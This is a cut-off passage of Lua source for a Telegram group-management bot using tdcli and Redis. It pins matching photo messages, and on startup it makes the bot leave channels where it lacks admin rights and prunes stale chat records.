id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) redis:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
end
elseif data.ID == ("UpdateOption") and data.value_.value_ == ("Ready") and tdcli_update_callback_value_(Data) ~= false then
local list = redis:smembers(bot_id..'Num:User:Pv')  
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local list = redis:smembers(bot_id..'ChekBotAdd') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
redis:srem(bot_id..'ChekBotAdd',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
redis:srem(bot_id..'ChekBotAdd',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
redis:srem(bot_id..'ChekBotAdd',v)  
end
if data and data.code_ and data.code_ == 400 then
redis:srem(bot_id..'ChekBotAdd',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
redis:sadd(bot_id..'ChekBotAdd',v)  
end 
end,nil)
end
end
end










